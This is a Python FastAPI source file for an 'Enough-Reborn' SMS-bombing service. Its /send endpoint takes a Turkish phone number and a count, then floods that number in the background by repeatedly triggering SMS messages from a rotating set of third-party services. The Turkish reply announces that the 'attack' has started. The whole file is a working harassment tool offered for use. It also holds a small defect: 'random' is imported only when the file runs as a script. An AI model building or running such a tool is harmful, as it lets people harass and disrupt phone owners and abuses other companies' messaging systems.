from fastapi import FastAPI, BackgroundTasks
from sms import SendSms
import threading

app = FastAPI(title="Enough-Reborn Ultimate SMS API")

# Dynamically discover services
def get_services():
    return [attr for attr in dir(SendSms) if callable(getattr(SendSms, attr)) and not attr.startswith("__") and attr != "adet"]

@app.get("/")
def read_root():
    services = get_services()
    return {
        "status": "online",
        "message": "Enough-Reborn Ultimate SMS API is running.",
        "service_count": len(services),
        "usage": "/send?phone=5XXXXXXXXX&amount=10"
    }

@app.get("/services")
def list_services():
    return {"services": get_services()}

@app.get("/send")
def send_sms(phone: str, amount: int = 1, background_tasks: BackgroundTasks = None):
    if len(phone) != 10 or not phone.isdigit():
        return {"error": "Telefon numarası 10 haneli olmalıdır (örn: 5551234567)"}
    
    sms = SendSms(phone, "")
    services = get_services()
    
    def run_bombing():
        sent = 0
        while sent < amount:
            random_services = list(services)
            random.shuffle(random_services)
            for srv in random_services:
                if sent >= amount: break
                getattr(sms, srv)()
                sent += 1

    background_tasks.add_task(run_bombing)
    return {
        "status": "success", 
        "phone": phone,
        "amount": amount,
        "message": f"Saldırı başlatıldı. {amount} SMS arka planda gönderiliyor."
    }

if __name__ == "__main__":
    import uvicorn
    import random
    uvicorn.run(app, host="0.0.0.0", port=8000)
